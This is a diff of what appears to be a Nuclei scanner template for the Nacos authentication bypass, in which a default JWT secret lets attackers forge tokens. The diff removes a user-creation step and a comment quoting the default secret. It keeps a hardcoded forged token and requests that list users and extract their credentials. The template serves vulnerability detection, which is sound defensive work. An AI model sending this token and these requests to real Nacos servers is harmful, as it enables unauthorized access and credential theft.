@@ -1,82 +1,47 @@
-id: nacos-bypass-authentication
-
-variables:
-  token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.vqhkMLKmquQ6R5AD6VWrTOqgClC599nnAQgQLHhPcLc
-  # token is signed with a very long time expire.
+id: nacos-authentication-bypass
 
 info:
-  name: Nacos Bypass Auth with default jwt secret
+  name: Nacos < 2.2.0 - Authentication Bypass
   author: Esonhugh
   severity: critical
-  classification:
-    cwe-id: cwe-281
   description: |
-    Nasos bypass authentication with default jwt secret:
-    'SecretKey012345678901234567890123456789012345678901234567890123456789'
+    The authentication function of Nacos is can be bypass through default JWT secret.
   reference:
     - https://github.com/alibaba/nacos/issues/10060
     - https://avd.aliyun.com/detail?id=AVD-2023-1655789
     - https://nacos.io/zh-cn/docs/auth.html
-  tags: auth-bypass, nacos
+  remediation: Change value of jwt secret in the configurations
+  tags: auth-bypass,nacos,misconfig,jwt
 
-# stop-at-first-match: true
+variables:
+  token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g
+
 requests:
   - method: GET
     path:
-      # - "{{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.vqhkMLKmquQ6R5AD6VWrTOqgClC599nnAQgQLHhPcLc"
       - "{{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token}}"
-      # - "{{BaseURL}}/v1/auth/users?pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.vqhkMLKmquQ6R5AD6VWrTOqgClC599nnAQgQLHhPcLc"
       - "{{BaseURL}}/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token}}"
+    stop-at-first-match: true
     matchers-condition: and
     matchers:
-      - type: status
-        status:
-          - 200
-
       - type: word
         words:
           - '"username":'
           - '"password":'
         condition: and
+
       - type: word
         part: header
         words:
           - "application/json"
 
-    extractors:
-      - type: json
-        part: body
-        json:
-          - "{ name: .pageItems.[].username , pass: .pageItems.[].password }"
-        name: extract default username and password
-
-  - method: POST
-    path:
-      - "{{BaseURL}}/nacos/v1/auth/users"
-      - "{{BaseURL}}/v1/auth/users"
-    headers:
-      Content-Type: application/x-www-form-urlencoded
-      accessToken: "{{token}}"
-    body: "username=testuser{{randstr_1}}&password={{randstr_2}}"
-    matchers-condition: and
-    matchers:
       - type: status
         status:
           - 200
-      - type: word
-        words:
-          - '"code":'
-          - "200"
-          - '"data":'
-          - '"create user ok!"'
-        condition: and
-      - type: word
-        part: header
-        words:
-          - "application/json"
+
     extractors:
       - type: json
         part: body
+        name: extracted-credentials
         json:
-          - ".message"
-        name: Create user testuser{{randstr_1}}/{{randstr_2}}
+          - ".pageItems[]"
